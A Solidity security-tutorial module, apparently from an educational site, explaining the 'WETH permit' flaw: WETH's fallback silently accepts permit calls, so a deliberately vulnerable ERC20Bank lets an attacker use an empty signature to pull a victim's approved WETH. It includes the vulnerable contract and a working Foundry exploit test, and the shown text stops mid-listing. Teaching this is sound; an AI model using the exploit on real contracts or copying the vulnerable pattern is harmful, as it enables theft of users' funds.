// metadata
export const version = "0.8.24"
export const title = "WETH Permit"
export const description = "An example of WETH permit hack"

export const keywords = ["hack", "security", "weth", "permit"]

export const codes = [
  {
    fileName: "ERC20.sol",
    code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yNDsKCmFic3RyYWN0IGNvbnRyYWN0IEVSQzIwIHsKICAgIGV2ZW50IFRyYW5zZmVyKGFkZHJlc3MgaW5kZXhlZCBmcm9tLCBhZGRyZXNzIGluZGV4ZWQgdG8sIHVpbnQyNTYgYW1vdW50KTsKICAgIGV2ZW50IEFwcHJvdmFsKAogICAgICAgIGFkZHJlc3MgaW5kZXhlZCBvd25lciwgYWRkcmVzcyBpbmRleGVkIHNwZW5kZXIsIHVpbnQyNTYgYW1vdW50CiAgICApOwoKICAgIHN0cmluZyBwdWJsaWMgbmFtZTsKICAgIHN0cmluZyBwdWJsaWMgc3ltYm9sOwogICAgdWludDggcHVibGljIGltbXV0YWJsZSBkZWNpbWFsczsKCiAgICB1aW50MjU2IHB1YmxpYyB0b3RhbFN1cHBseTsKICAgIG1hcHBpbmcoYWRkcmVzcyA9PiB1aW50MjU2KSBwdWJsaWMgYmFsYW5jZU9mOwogICAgbWFwcGluZyhhZGRyZXNzID0+IG1hcHBpbmcoYWRkcmVzcyA9PiB1aW50MjU2KSkgcHVibGljIGFsbG93YW5jZTsKCiAgICBjb25zdHJ1Y3RvcihzdHJpbmcgbWVtb3J5IF9uYW1lLCBzdHJpbmcgbWVtb3J5IF9zeW1ib2wsIHVpbnQ4IF9kZWNpbWFscykgewogICAgICAgIG5hbWUgPSBfbmFtZTsKICAgICAgICBzeW1ib2wgPSBfc3ltYm9sOwogICAgICAgIGRlY2ltYWxzID0gX2RlY2ltYWxzOwogICAgfQoKICAgIGZ1bmN0aW9uIGFwcHJvdmUoYWRkcmVzcyBzcGVuZGVyLCB1aW50MjU2IGFtb3VudCkKICAgICAgICBwdWJsaWMKICAgICAgICB2aXJ0dWFsCiAgICAgICAgcmV0dXJucyAoYm9vbCkKICAgIHsKICAgICAgICBhbGxvd2FuY2VbbXNnLnNlbmRlcl1bc3BlbmRlcl0gPSBhbW91bnQ7CiAgICAgICAgZW1pdCBBcHByb3ZhbChtc2cuc2VuZGVyLCBzcGVuZGVyLCBhbW91bnQpOwogICAgICAgIHJldHVybiB0cnVlOwogICAgfQoKICAgIGZ1bmN0aW9uIHRyYW5zZmVyKGFkZHJlc3MgdG8sIHVpbnQyNTYgYW1vdW50KQogICAgICAgIHB1YmxpYwogICAgICAgIHZpcnR1YWwKICAgICAgICByZXR1cm5zIChib29sKQogICAgewogICAgICAgIGJhbGFuY2VPZlttc2cuc2VuZGVyXSAtPSBhbW91bnQ7CiAgICAgICAgdW5jaGVja2VkIHsKICAgICAgICAgICAgYmFsYW5jZU9mW3RvXSArPSBhbW91bnQ7CiAgICAgICAgfQogICAgICAgIGVtaXQgVHJhbnNmZXIobXNnLnNlbmRlciwgdG8sIGFtb3VudCk7CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CgogICAgZnVuY3Rpb24gdHJhbnNmZXJGcm9tKGFkZHJlc3MgZnJvbSwgYWRkcmVzcyB0bywgdWludDI1NiBhbW91bnQpCiAgICAgICAgcHVibGljCiAgICAgICAgdmlydHVhbAogICAgICAgIHJldHVybnMgKGJvb2wpCiAgICB7CiAgICAgICAgdWludDI1NiBhbGxvd2VkID0gYWxsb3dhbmNlW2Zyb21dW21zZy5zZW5kZXJdOwogICAgICAgIGlmIChhbGxvd2VkICE9IHR5cGUodWludDI1NikubWF4KSB7CiAgICAgICAgICAgIGFsbG93YW5jZVtmcm9tXVttc2cuc2VuZGVyXSA9IGFsbG93ZWQgLSBhbW91bnQ7CiAgICAgICAgfQogICAgICAgIGJhbGFuY2VPZltmcm9tXSAtPSBhbW91bnQ7CiAgICAgICAgdW5jaGVja2VkIHsKICAgICAgICAgICAgYmFsYW5jZU9mW3RvXSArPSBhbW91bnQ7CiAgICAgICAgfQogICAgICAgIGVtaXQgVHJhbnNmZXIoZnJvbSwgdG8sIGFtb3VudCk7CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CgogICAgZnVuY3Rpb24gX21pbnQoYWRkcmVzcyB0bywgdWludDI1NiBhbW91bnQpIGludGVybmFsIHZpcnR1YWwgewogICAgICAgIHRvdGFsU3VwcGx5ICs9IGFtb3VudDsKICAgICAgICB1bmNoZWNrZWQgewogICAgICAgICAgICBiYWxhbmNlT2ZbdG9dICs9IGFtb3VudDsKICAgICAgICB9CiAgICAgICAgZW1pdCBUcmFuc2ZlcihhZGRyZXNzKDApLCB0bywgYW1vdW50KTsKICAgIH0KCiAgICBmdW5jdGlvbiBfYnVybihhZGRyZXNzIGZyb20sIHVpbnQyNTYgYW1vdW50KSBpbnRlcm5hbCB2aXJ0dWFsIHsKICAgICAgICBiYWxhbmNlT2ZbZnJvbV0gLT0gYW1vdW50OwogICAgICAgIHVuY2hlY2tlZCB7CiAgICAgICAgICAgIHRvdGFsU3VwcGx5IC09IGFtb3VudDsKICAgICAgICB9CiAgICAgICAgZW1pdCBUcmFuc2Zlcihmcm9tLCBhZGRyZXNzKDApLCBhbW91bnQpOwogICAgfQp9Cg==",
  },
  {
    fileName: "ERC20Bank.sol",
    code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yNDsKCmltcG9ydCAiLi9JRVJDMjBQZXJtaXQuc29sIjsKCmNvbnRyYWN0IEVSQzIwQmFuayB7CiAgICBJRVJDMjBQZXJtaXQgcHVibGljIGltbXV0YWJsZSB0b2tlbjsKICAgIG1hcHBpbmcoYWRkcmVzcyA9PiB1aW50MjU2KSBwdWJsaWMgYmFsYW5jZU9mOwoKICAgIGNvbnN0cnVjdG9yKGFkZHJlc3MgX3Rva2VuKSB7CiAgICAgICAgdG9rZW4gPSBJRVJDMjBQZXJtaXQoX3Rva2VuKTsKICAgIH0KCiAgICBmdW5jdGlvbiBkZXBvc2l0KHVpbnQyNTYgX2Ftb3VudCkgZXh0ZXJuYWwgewogICAgICAgIHRva2VuLnRyYW5zZmVyRnJvbShtc2cuc2VuZGVyLCBhZGRyZXNzKHRoaXMpLCBfYW1vdW50KTsKICAgICAgICBiYWxhbmNlT2ZbbXNnLnNlbmRlcl0gKz0gX2Ftb3VudDsKICAgIH0KCiAgICBmdW5jdGlvbiBkZXBvc2l0V2l0aFBlcm1pdCgKICAgICAgICBhZGRyZXNzIG93bmVyLAogICAgICAgIGFkZHJlc3MgcmVjaXBpZW50LAogICAgICAgIHVpbnQyNTYgYW1vdW50LAogICAgICAgIHVpbnQyNTYgZGVhZGxpbmUsCiAgICAgICAgdWludDggdiwKICAgICAgICBieXRlczMyIHIsCiAgICAgICAgYnl0ZXMzMiBzCiAgICApIGV4dGVybmFsIHsKICAgICAgICB0b2tlbi5wZXJtaXQob3duZXIsIGFkZHJlc3ModGhpcyksIGFtb3VudCwgZGVhZGxpbmUsIHYsIHIsIHMpOwogICAgICAgIHRva2VuLnRyYW5zZmVyRnJvbShvd25lciwgYWRkcmVzcyh0aGlzKSwgYW1vdW50KTsKICAgICAgICBiYWxhbmNlT2ZbcmVjaXBpZW50XSArPSBhbW91bnQ7CiAgICB9CgogICAgZnVuY3Rpb24gd2l0aGRyYXcodWludDI1NiBfYW1vdW50KSBleHRlcm5hbCB7CiAgICAgICAgYmFsYW5jZU9mW21zZy5zZW5kZXJdIC09IF9hbW91bnQ7CiAgICAgICAgdG9rZW4udHJhbnNmZXIobXNnLnNlbmRlciwgX2Ftb3VudCk7CiAgICB9Cn0K",
  },
  {
    fileName: "ERC20BankExploitTest.sol",
    code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgMC44LjI0OwoKaW1wb3J0IHtUZXN0LCBjb25zb2xlMn0gZnJvbSAiZm9yZ2Utc3RkL1Rlc3Quc29sIjsKaW1wb3J0IHtXRVRIfSBmcm9tICIuLi8uLi8uLi9zcmMvaGFja3Mvd2V0aC1wZXJtaXQvV0VUSC5zb2wiOwppbXBvcnQge0VSQzIwQmFua30gZnJvbSAiLi4vLi4vLi4vc3JjL2hhY2tzL3dldGgtcGVybWl0L0VSQzIwQmFuay5zb2wiOwoKY29udHJhY3QgRVJDMjBCYW5rRXhwbG9pdFRlc3QgaXMgVGVzdCB7CiAgICBXRVRIIHByaXZhdGUgd2V0aDsKICAgIEVSQzIwQmFuayBwcml2YXRlIGJhbms7CiAgICBhZGRyZXNzIHByaXZhdGUgY29uc3RhbnQgdXNlciA9IGFkZHJlc3MoMTEpOwogICAgYWRkcmVzcyBwcml2YXRlIGNvbnN0YW50IGF0dGFja2VyID0gYWRkcmVzcygxMik7CgogICAgZnVuY3Rpb24gc2V0VXAoKSBwdWJsaWMgewogICAgICAgIHdldGggPSBuZXcgV0VUSCgpOwogICAgICAgIGJhbmsgPSBuZXcgRVJDMjBCYW5rKGFkZHJlc3Mod2V0aCkpOwoKICAgICAgICBkZWFsKHVzZXIsIDEwMCAqIDFlMTgpOwogICAgICAgIHZtLnN0YXJ0UHJhbmsodXNlcik7CiAgICAgICAgd2V0aC5kZXBvc2l0e3ZhbHVlOiAxMDAgKiAxZTE4fSgpOwogICAgICAgIHdldGguYXBwcm92ZShhZGRyZXNzKGJhbmspLCB0eXBlKHVpbnQyNTYpLm1heCk7CiAgICAgICAgYmFuay5kZXBvc2l0KDFlMTgpOwogICAgICAgIHZtLnN0b3BQcmFuaygpOwogICAgfQoKICAgIGZ1bmN0aW9uIHRlc3QoKSBwdWJsaWMgewogICAgICAgIHVpbnQyNTYgYmFsID0gd2V0aC5iYWxhbmNlT2YodXNlcik7CiAgICAgICAgdm0uc3RhcnRQcmFuayhhdHRhY2tlcik7CiAgICAgICAgYmFuay5kZXBvc2l0V2l0aFBlcm1pdCh1c2VyLCBhdHRhY2tlciwgYmFsLCAwLCAwLCAiIiwgIiIpOwogICAgICAgIGJhbmsud2l0aGRyYXcoYmFsKTsKICAgICAgICB2bS5zdG9wUHJhbmsoKTsKCiAgICAgICAgYXNzZXJ0RXEod2V0aC5iYWxhbmNlT2YodXNlciksIDAsICJXRVRIIGJhbGFuY2Ugb2YgdXNlciIpOwogICAgICAgIGFzc2VydEVxKAogICAgICAgICAgICB3ZXRoLmJhbGFuY2VPZihhZGRyZXNzKGF0dGFja2VyKSksCiAgICAgICAgICAgIDk5ICogMWUxOCwKICAgICAgICAgICAgIldFVEggYmFsYW5jZSBvZiBhdHRhY2tlciIKICAgICAgICApOwogICAgfQp9Cg==",
  },
  {
    fileName: "IERC20.sol",
    code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yNDsKCmludGVyZmFjZSBJRVJDMjAgewogICAgZnVuY3Rpb24gdG90YWxTdXBwbHkoKSBleHRlcm5hbCB2aWV3IHJldHVybnMgKHVpbnQyNTYpOwogICAgZnVuY3Rpb24gYmFsYW5jZU9mKGFkZHJlc3MgYWNjb3VudCkgZXh0ZXJuYWwgdmlldyByZXR1cm5zICh1aW50MjU2KTsKICAgIGZ1bmN0aW9uIGFsbG93YW5jZShhZGRyZXNzIG93bmVyLCBhZGRyZXNzIHNwZW5kZXIpCiAgICAgICAgZXh0ZXJuYWwKICAgICAgICB2aWV3CiAgICAgICAgcmV0dXJucyAodWludDI1Nik7CiAgICBmdW5jdGlvbiBhcHByb3ZlKGFkZHJlc3Mgc3BlbmRlciwgdWludDI1NiBhbW91bnQpIGV4dGVybmFsIHJldHVybnMgKGJvb2wpOwogICAgZnVuY3Rpb24gdHJhbnNmZXIoYWRkcmVzcyBkc3QsIHVpbnQyNTYgYW1vdW50KSBleHRlcm5hbCByZXR1cm5zIChib29sKTsKICAgIGZ1bmN0aW9uIHRyYW5zZmVyRnJvbShhZGRyZXNzIHNyYywgYWRkcmVzcyBkc3QsIHVpbnQyNTYgYW1vdW50KQogICAgICAgIGV4dGVybmFsCiAgICAgICAgcmV0dXJucyAoYm9vbCk7CgogICAgZXZlbnQgVHJhbnNmZXIoYWRkcmVzcyBpbmRleGVkIHNyYywgYWRkcmVzcyBpbmRleGVkIGRzdCwgdWludDI1NiBhbW91bnQpOwogICAgZXZlbnQgQXBwcm92YWwoCiAgICAgICAgYWRkcmVzcyBpbmRleGVkIG93bmVyLCBhZGRyZXNzIGluZGV4ZWQgc3BlbmRlciwgdWludDI1NiBhbW91bnQKICAgICk7Cn0K",
  },
  {
    fileName: "IERC20Permit.sol",
    code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yNDsKCmltcG9ydCAiLi9JRVJDMjAuc29sIjsKCmludGVyZmFjZSBJRVJDMjBQZXJtaXQgaXMgSUVSQzIwIHsKICAgIGZ1bmN0aW9uIHBlcm1pdCgKICAgICAgICBhZGRyZXNzIG93bmVyLAogICAgICAgIGFkZHJlc3Mgc3BlbmRlciwKICAgICAgICB1aW50MjU2IHZhbHVlLAogICAgICAgIHVpbnQyNTYgZGVhZGxpbmUsCiAgICAgICAgdWludDggdiwKICAgICAgICBieXRlczMyIHIsCiAgICAgICAgYnl0ZXMzMiBzCiAgICApIGV4dGVybmFsOwp9Cg==",
  },
  {
    fileName: "WETH.sol",
    code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yNDsKCmltcG9ydCAiLi9FUkMyMC5zb2wiOwoKY29udHJhY3QgV0VUSCBpcyBFUkMyMCB7CiAgICBldmVudCBEZXBvc2l0KGFkZHJlc3MgaW5kZXhlZCBhY2NvdW50LCB1aW50MjU2IGFtb3VudCk7CiAgICBldmVudCBXaXRoZHJhdyhhZGRyZXNzIGluZGV4ZWQgYWNjb3VudCwgdWludDI1NiBhbW91bnQpOwoKICAgIGNvbnN0cnVjdG9yKCkgRVJDMjAoIldyYXBwZWQgRXRoZXIiLCAiV0VUSCIsIDE4KSB7fQoKICAgIGZhbGxiYWNrKCkgZXh0ZXJuYWwgcGF5YWJsZSB7CiAgICAgICAgZGVwb3NpdCgpOwogICAgfQoKICAgIGZ1bmN0aW9uIGRlcG9zaXQoKSBwdWJsaWMgcGF5YWJsZSB7CiAgICAgICAgX21pbnQobXNnLnNlbmRlciwgbXNnLnZhbHVlKTsKICAgICAgICBlbWl0IERlcG9zaXQobXNnLnNlbmRlciwgbXNnLnZhbHVlKTsKICAgIH0KCiAgICBmdW5jdGlvbiB3aXRoZHJhdyh1aW50MjU2IGFtb3VudCkgZXh0ZXJuYWwgewogICAgICAgIF9idXJuKG1zZy5zZW5kZXIsIGFtb3VudCk7CiAgICAgICAgcGF5YWJsZShtc2cuc2VuZGVyKS50cmFuc2ZlcihhbW91bnQpOwogICAgICAgIGVtaXQgV2l0aGRyYXcobXNnLnNlbmRlciwgYW1vdW50KTsKICAgIH0KfQo=",
  },
]

const html = `<h3>Vulnerability</h3>
<p>Most ERC20 have the <code>permit</code> function to approve a spender if a valid signature is provided.</p>
<p>However <code>WETH</code> does not. Surprisingly, when <code>permit</code> is called on <code>WETH</code>, the function call will execute without any errors.</p>
<p>This is because the <code>fallback</code> inside <code>WETH</code> is execute when <code>permit</code> is called.</p>
<h3>Example</h3>
<ol start="0">
<li>Alice gives infinite approval for <code>ERC20Bank</code> to spend <code>WETH</code></li>
<li>Alice calls <code>deposit</code>, deposits 1 WETH into <code>ERC20Bank</code></li>
<li>Attacker calls <code>depositWithPermit</code>, passes an empty signature and transfers all tokens from Alice into <code>ERC20Bank</code>, crediting the attacker for the deposit.</li>
<li>Attacker withdraws all tokens credited to him.</li>
</ol>
<h3>ERC20Bank</h3>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.24;</span>

<span class="hljs-keyword">import</span> <span class="hljs-string">"./IERC20Permit.sol"</span>;

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">ERC20Bank</span> </span>{
    IERC20Permit <span class="hljs-keyword">public</span> <span class="hljs-keyword">immutable</span> token;
    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">uint256</span>) <span class="hljs-keyword">public</span> balanceOf;

    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _token</span>) </span>{
        token <span class="hljs-operator">=</span> IERC20Permit(_token);
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deposit</span>(<span class="hljs-params"><span class="hljs-keyword">uint256</span> _amount</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> </span>{
        token.transferFrom(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>), _amount);
        balanceOf[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] <span class="hljs-operator">+</span><span class="hljs-operator">=</span> _amount;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">depositWithPermit</span>(<span class="hljs-params">
        <span class="hljs-keyword">address</span> owner,
        <span class="hljs-keyword">address</span> recipient,
        <span class="hljs-keyword">uint256</span> amount,
        <span class="hljs-keyword">uint256</span> deadline,
        <span class="hljs-keyword">uint8</span> v,
        <span class="hljs-keyword">bytes32</span> r,
        <span class="hljs-keyword">bytes32</span> s
    </span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> </span>{
        token.permit(owner, <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>), amount, deadline, v, r, s);
        token.transferFrom(owner, <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>), amount);
        balanceOf[recipient] <span class="hljs-operator">+</span><span class="hljs-operator">=</span> amount;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"><span class="hljs-keyword">uint256</span> _amount</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> </span>{
        balanceOf[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] <span class="hljs-operator">-</span><span class="hljs-operator">=</span> _amount;
        token.<span class="hljs-built_in">transfer</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, _amount);
    }
}
</code></pre><h3>Exploit</h3>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> 0.8.24;</span>

<span class="hljs-keyword">import</span> {<span class="hljs-title">Test</span>, <span class="hljs-title">console2</span>} <span class="hljs-title"><span class="hljs-keyword">from</span></span> <span class="hljs-string">"forge-std/Test.sol"</span>;
<span class="hljs-keyword">import</span> {<span class="hljs-title">WETH</span>} <span class="hljs-title"><span class="hljs-keyword">from</span></span> <span class="hljs-string">"../../../src/hacks/weth-permit/WETH.sol"</span>;
<span class="hljs-keyword">import</span> {<span class="hljs-title">ERC20Bank</span>} <span class="hljs-title"><span class="hljs-keyword">from</span></span> <span class="hljs-string">"../../../src/hacks/weth-permit/ERC20Bank.sol"</span>;

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">ERC20BankExploitTest</span> <span class="hljs-keyword">is</span> <span class="hljs-title">Test</span> </span>{
    WETH <span class="hljs-keyword">private</span> weth;
    ERC20Bank <span class="hljs-keyword">private</span> bank;
    <span class="hljs-keyword">address</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">constant</span> user <span class="hljs-operator">=</span> <span class="hljs-keyword">address</span>(<span class="hljs-number">11</span>);
    <span class="hljs-keyword">address</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">constant</span> attacker <span class="hljs-operator">=</span> <span class="hljs-keyword">address</span>(<span class="hljs-number">12</span>);

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setUp</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        weth <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> WETH();
        bank <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> ERC20Bank(<span class="hljs-keyword">address</span>(weth));

        deal(user, <span class="hljs-number">100</span> <span class="hljs-operator">*</span> <span class="hljs-number">1e18</span>);
        vm.startPrank(user);
        weth.deposit{<span class="hljs-built_in">value</span>: <span class="hljs-number">100</span> <span class="hljs-operator">*</span> <span class="hljs-number">1e18</span>}();
        weth.approve(<span class="hljs-keyword">address</span>(bank), <span class="hljs-keyword">type</span>(<span class="hljs-keyword">uint256</span>).<span class="hljs-built_in">max</span>);
        bank.deposit(<span class="hljs-number">1e18</span>);
        vm.stopPrank();
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        <span class="hljs-keyword">uint256</span> bal <span class="hljs-operator">=</span> weth.balanceOf(user);
        vm.startPrank(attacker);
        bank.depositWithPermit(user, attacker, bal, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-string">""</span>, <span class="hljs-string">""</span>);
        bank.withdraw(bal);
        vm.stopPrank();

        assertEq(weth.balanceOf(user), <span class="hljs-number">0</span>, <span class="hljs-string">"WETH balance of user"</span>);
        assertEq(
            weth.balanceOf(<span class="hljs-keyword">address</span>(attacker)),
            <span class="hljs-number">99</span> <span class="hljs-operator">*</span> <span class="hljs-number">1e18</span>,
            <span class="hljs-string">"WETH balance of attacker"</span>
        );
    }
}
</code></pre><h3>Other contracts</h3>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.24;</span>

<span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">IERC20</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">totalSupply</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint256</span></span>)</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">balanceOf</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> account</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint256</span></span>)</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">allowance</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> owner, <span class="hljs-keyword">address</span> spender</span>)
        <span class="hljs-title"><span class="hljs-keyword">external</span></span>
        <span class="hljs-title"><span class="hljs-keyword">view</span></span>
        <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint256</span></span>)</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">approve</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> spender, <span class="hljs-keyword">uint256</span> amount</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>)</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">transfer</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> dst, <span class="hljs-keyword">uint256</span> amount</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>)</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">transferFrom</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> src, <span class="hljs-keyword">address</span> dst, <span class="hljs-keyword">uint256</span> amount</span>)
        <span class="hljs-title"><span class="hljs-keyword">external</span></span>
        <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>)</span>;

    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">Transfer</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">indexed</span> src, <span class="hljs-keyword">address</span> <span class="hljs-keyword">indexed</span> dst, <span class="hljs-keyword">uint256</span> amount</span>)</span>;
    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">Approval</span>(<span class="hljs-params">
        <span class="hljs-keyword">address</span> <span class="hljs-keyword">indexed</span> owner, <span class="hljs-keyword">address</span> <span class="hljs-keyword">indexed</span> spender, <span class="hljs-keyword">uint256</span> amount
    </span>)</span>;
}
</code></pre><pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.24;</span>

<span class="hljs-keyword">import</span> <span class="hljs-string">"./IERC20.sol"</span>;

<span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">IERC20Permit</span> <span class="hljs-keyword">is</span> <span class="hljs-title">IERC20</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">permit</span>(<span class="hljs-params">
        <span class="hljs-keyword">address</span> owner,
        <span class="hljs-keyword">address</span> spender,
        <span class="hljs-keyword">uint256</span> value,
        <span class="hljs-keyword">uint256</span> deadline,
        <span class="hljs-keyword">uint8</span> v,
        <span class="hljs-keyword">bytes32</span> r,
        <span class="hljs-keyword">bytes32</span> s
    </span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span></span>;
}
</code></pre><pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.24;</span>

<span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">ERC20</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">Transfer</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">indexed</span> <span class="hljs-keyword">from</span>, <span class="hljs-keyword">address</span> <span class="hljs-keyword">indexed</span> to, <span class="hljs-keyword">uint256</span> amount</span>)</span>;
    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">Approval</span>(<span class="hljs-params">
        <span class="hljs-keyword">address</span> <span class="hljs-keyword">indexed</span> owner, <span class="hljs-keyword">address</span> <span class="hljs-keyword">indexed</span> spender, <span class="hljs-keyword">uint256</span> amount
    </span>)</span>;

    <span class="hljs-keyword">string</span> <span class="hljs-keyword">public</span> name;
    <span class="hljs-keyword">string</span> <span class="hljs-keyword">public</span> symbol;
    <span class="hljs-keyword">uint8</span> <span class="hljs-keyword">public</span> <span class="hljs-keyword">immutable</span> decimals;

    <span class="hljs-keyword">uint256</span> <span class="hljs-keyword">public</span> totalSupply;
    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">uint256</span>) <span class="hljs-keyword">public</span> balanceOf;
    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">uint256</span>)) <span class="hljs-keyword">public</span> allowance;

    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _name, <span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _symbol, <span class="hljs-keyword">uint8</span> _decimals</span>) </span>{
        name <span class="hljs-operator">=</span> _name;
        symbol <span class="hljs-operator">=</span> _symbol;
        decimals <span class="hljs-operator">=</span> _decimals;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">approve</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> spender, <span class="hljs-keyword">uint256</span> amount</span>)
        <span class="hljs-title"><span class="hljs-keyword">public</span></span>
        <span class="hljs-title"><span class="hljs-keyword">virtual</span></span>
        <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>)
    </span>{
        allowance[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>][spender] <span class="hljs-operator">=</span> amount;
        <span class="hljs-keyword">emit</span> Approval(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, spender, amount);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">transfer</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> to, <span class="hljs-keyword">uint256</span> amount</span>)
        <span class="hljs-title"><span class="hljs-keyword">public</span></span>
        <span class="hljs-title"><span class="hljs-keyword">virtual</span></span>
